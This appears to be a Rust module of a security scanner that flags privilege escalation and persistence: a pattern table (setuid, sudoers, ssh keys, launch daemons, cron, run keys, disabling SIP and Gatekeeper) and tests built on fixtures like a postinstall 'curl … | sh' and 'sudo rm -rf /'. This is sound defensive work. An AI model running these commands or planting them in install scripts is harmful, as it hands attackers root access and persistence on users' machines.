//! Privilege escalation and persistence: a download piped into a shell,
//! setuid bits, sudoers, ssh keys, launch daemons and agents, cron jobs,
//! services, run keys and scheduled tasks, SIP and Gatekeeper off, and
//! plain `sudo`. A shell script that uses sudo is an installer and warns;
//! an npm script, a node or Python file that runs commands, or installed
//! code doing the same fails. A file that runs nothing (website copy that
//! says "run sudo …", a string table) is prose: it cannot escalate, so it
//! isn't read for this at all.

use super::{Context, Kind, Suspect, line_of, push, test_path};

/// The ways a download is piped into a shell.
const DOWNLOADS: &[&str] = &["curl ", "wget "];
/// What the pipe may feed, as the start of the command after `|`.
const SHELLS: &[&str] = &["sh", "bash", "zsh", "sudo sh", "sudo bash", "python", "python3", "node", "perl"];

/// (needle, what it does, strong): a strong one fails wherever the context
/// is strong; a weak one fails only in a manifest.
const ESCALATIONS: &[(&str, &str, bool)] = &[
    ("with administrator privileges", "asks for an admin password through AppleScript", true),
    ("chmod u+s", "sets the setuid bit", true),
    ("chmod +s", "sets the setuid bit", true),
    ("chmod 4755", "sets the setuid bit", true),
    ("/etc/sudoers", "edits sudoers", true),
    ("authorized_keys", "adds an ssh key", true),
    ("/Library/LaunchDaemons", "installs a launch daemon", true),
    ("csrutil disable", "turns off System Integrity Protection", true),
    ("spctl --master-disable", "turns off Gatekeeper", true),
    ("xattr -d com.apple.quarantine", "strips the quarantine flag from a download", true),
    ("Library/LaunchAgents", "installs a launch agent", false),
    ("crontab -", "installs a cron job", false),
    ("systemctl enable", "installs a service", false),
    ("/etc/systemd/system", "installs a service", false),
    ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "installs a Windows run key", true),
    ("schtasks /create", "installs a scheduled task", true),
    ("sudo ", "uses sudo", false),
];

/// Whether the file runs commands at all (a script, not prose in a string).
fn runs_commands(text: &str, ctx: Context) -> bool {
    match ctx {
        Context::Shell | Context::Manifest => true,
        Context::Web => [
            "child_process",
            "execSync(",
            "spawnSync(",
            "spawn(",
            "execFile(",
            "exec(",
            "Deno.run(",
            "Deno.Command(",
            "Bun.spawn(",
            "Bun.$",
        ]
        .iter()
        .any(|s| text.contains(s)),
        Context::Python => [
            "subprocess",
            concat!("os.sys", "tem("),
            concat!("os.po", "pen("),
            "commands.getoutput(",
            "pty.spawn(",
            concat!("sys", "tem("),
            "backtick",
            "`",
        ]
        .iter()
        .any(|s| text.contains(s)),
        // Spelled in pieces so this file, which is Rust, doesn't contain them.
        Context::Native => [
            concat!("sys", "tem("),
            concat!("po", "pen("),
            concat!("exe", "cv"),
            concat!("exe", "cl"),
            concat!("posix_", "spawn"),
            concat!("Command", "::new("),
            concat!("std::", "process"),
            concat!("Process", "Builder"),
            concat!("Runtime.getRuntime()", ".exec("),
            concat!("Process", ".Start("),
            concat!("NS", "Task"),
            concat!("exec.", "Command("),
            concat!("os/", "exec"),
        ]
        .iter()
        .any(|s| text.contains(s)),
        _ => false,
    }
}

pub(super) fn scan(file: &str, text: &str, ctx: Context, kind: Kind, out: &mut Vec<Suspect>) {
    let scripted = runs_commands(text, ctx);
    if !matches!(ctx, Context::Shell | Context::Python | Context::Web | Context::Manifest | Context::Native)
        || !(scripted || kind == Kind::Installed)
    {
        return;
    }
    let strong_ctx = ctx == Context::Manifest || (scripted && ctx != Context::Shell) || kind == Kind::Installed;
    let soft = test_path(file) || ctx == Context::Shell;
    let found = DOWNLOADS
        .iter()
        .find_map(|needle| {
            pipe_to_shell(text, needle)
                .map(|l| (l, format!("pipes a download into a shell (`{}… | sh`)", needle.trim()), strong_ctx))
        })
        .or_else(|| {
            ESCALATIONS.iter().find(|(needle, _, _)| text.contains(needle)).map(|(needle, what, strong)| {
                (
                    line_of(text, needle),
                    format!("{what} (`{}`)", needle.trim()),
                    strong_ctx && (*strong || ctx == Context::Manifest),
                )
            })
        });
    if let Some((line, note, hard)) = found {
        push(out, file, "SUSPECT-PRIV-ESCALATION", line, note, hard && !soft);
    }
}

/// `curl …| sh` and friends: the needle, then a pipe into a shell on the same line.
fn pipe_to_shell(text: &str, needle: &str) -> Option<usize> {
    for (n, line) in text.lines().enumerate() {
        if let Some(i) = line.find(needle) {
            let rest = &line[i..];
            if let Some(p) = rest.find('|') {
                let after = rest[p + 1..].trim_start();
                if SHELLS.iter().any(|s| {
                    after.starts_with(s)
                        && after[s.len()..].chars().next().is_none_or(|c| !c.is_ascii_alphanumeric() && c != '_')
                }) {
                    return Some(n + 1);
                }
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::super::{Kind, ids, scan_text};
    use super::*;

    const NODE: &str =
        "const { execSync } = require('child_process');\nexecSync('curl -fsSL https://x.y/i.sh | sh');\n";

    #[test]
    fn a_piped_download_fails_where_it_runs_and_warns_in_an_installer() {
        let pkg = "{\"scripts\": {\"postinstall\": \"curl -fsSL https://x.y/i.sh | sh\"}}";
        let got = scan_text("package.json", pkg, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-PRIV-ESCALATION", true)]);
        assert!(got[0].note.contains("pipes a download into a shell (`curl… | sh`)"), "{}", got[0].note);
        assert_eq!(
            ids(&scan_text("setup.js", NODE, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", true)],
            "a node script that runs it fails"
        );
        assert_eq!(
            ids(&scan_text("install.sh", "#!/bin/sh\ncurl -fsSL https://x.y/i.sh | sh\n", Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "a shell installer warns"
        );
        assert_eq!(
            ids(&scan_text(".github/workflows/ci.yml", "run: curl -fsSL https://x.y/i.sh | sh\n", Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "a workflow step is a shell script"
        );
        assert_eq!(
            ids(&scan_text("src/main.c", &format!("{}(\"curl https://x.y/i.sh | sh\");\n", "system"), Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", true)],
            "native code that spawns a shell"
        );
        assert_eq!(
            ids(&scan_text(
                "tool.py",
                "import subprocess\nsubprocess.run('wget -qO- https://x.y | bash', shell=True)\n",
                Kind::Repo
            )),
            [("SUSPECT-PRIV-ESCALATION", true)]
        );
        assert_eq!(
            ids(&scan_text("src/x.test.ts", NODE, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "tests warn"
        );
    }

    #[test]
    fn sudo_and_persistence_by_strength() {
        let sh = "#!/bin/sh\nsudo apt-get install -y foo\n";
        assert_eq!(
            ids(&scan_text("install.sh", sh, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "an installer may sudo"
        );
        assert_eq!(
            ids(&scan_text("install.sh", "chmod u+s /usr/bin/x\n", Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "a shell script always warns"
        );
        let setuid = "require('child_process').execSync('chmod u+s ./helper');\n";
        let got = scan_text("setup.js", setuid, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-PRIV-ESCALATION", true)], "a strong escalation in a node script fails");
        assert!(got[0].note.contains("sets the setuid bit (`chmod u+s`)"), "{}", got[0].note);
        let agent = "require('child_process').execSync('cp x ~/Library/LaunchAgents/');\n";
        assert_eq!(
            ids(&scan_text("setup.js", agent, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "a weak one in a node script warns"
        );
        assert_eq!(
            ids(&scan_text("package.json", "{\"scripts\": {\"postinstall\": \"sudo make install\"}}", Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", true)],
            "a weak one in a manifest fails"
        );
        let weak_node = "require('child_process').execSync('sudo make install');\n";
        assert_eq!(ids(&scan_text("setup.js", weak_node, Kind::Repo)), [("SUSPECT-PRIV-ESCALATION", false)]);
        assert_eq!(
            ids(&scan_text("ext/main.js", weak_node, Kind::Installed)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "installed code is a strong context, but sudo itself is weak"
        );
        assert_eq!(
            ids(&scan_text("ext/main.js", "chmod 4755 ./x", Kind::Installed)),
            [("SUSPECT-PRIV-ESCALATION", true)],
            "installed code that runs nothing is still read"
        );
        let one = scan_text("install.sh", "sudo x\ncrontab - < job\n", Kind::Repo);
        assert_eq!(one.len(), 1, "one finding per file, the first in the table: {one:?}");
        assert!(one[0].note.contains("installs a cron job"), "{}", one[0].note);
    }

    #[test]
    fn prose_and_string_tables_run_nothing() {
        let prose = "export const copy = 'Run: sudo softwareupdate -i -a';\n";
        assert!(scan_text("src/content/home.ts", prose, Kind::Repo).is_empty(), "prose in a string runs nothing");
        assert!(scan_text("docs/diagram.tsx", "const label = 'curl … | sh';\n", Kind::Repo).is_empty());
        assert!(scan_text("src/lib.rs", "// run `sudo make install` afterwards\n", Kind::Repo).is_empty());
        assert!(scan_text("README.md", "sudo rm -rf /", Kind::Installed).is_empty(), "prose is not a context at all");
        assert!(
            scan_text("package.nls.json", "{\"d\": \"reads ~/.docker/config.json\"}", Kind::Installed).is_empty(),
            "a string table is not code"
        );
        assert!(scan_text("style.css", "/* sudo */", Kind::Installed).is_empty());
        assert!(runs_commands("x", Context::Shell));
        assert!(runs_commands("x", Context::Manifest));
        assert!(runs_commands("Bun.$`ls`", Context::Web));
        assert!(!runs_commands("fetch(x)", Context::Web));
        assert!(runs_commands(&format!("{}('ls')", "os.system"), Context::Python));
        assert!(runs_commands(&format!("{}::new(\"ls\")", "Command"), Context::Native));
        assert!(!runs_commands("fn main() {}", Context::Native));
        assert!(!runs_commands("spawn(", Context::Markup), "markup never runs commands");
    }

    #[test]
    fn pipes_into_shells() {
        assert_eq!(pipe_to_shell("curl https://a/b.sh | shuf", "curl "), None, "`shuf` is not `sh`");
        assert_eq!(pipe_to_shell("wget -qO- https://a | sudo bash -s", "wget "), Some(1));
        assert_eq!(pipe_to_shell("x\ncurl https://a | python3 -\n", "curl "), Some(2));
        assert_eq!(pipe_to_shell("curl https://a | jq .\nsh x", "curl "), None, "the shell must be on the pipe's line");
        assert_eq!(pipe_to_shell("curl https://a > f.sh", "curl "), None);
        assert_eq!(
            pipe_to_shell("curl https://a |bash_helper", "curl "),
            None,
            "an identifier that starts with `bash`"
        );
    }
}
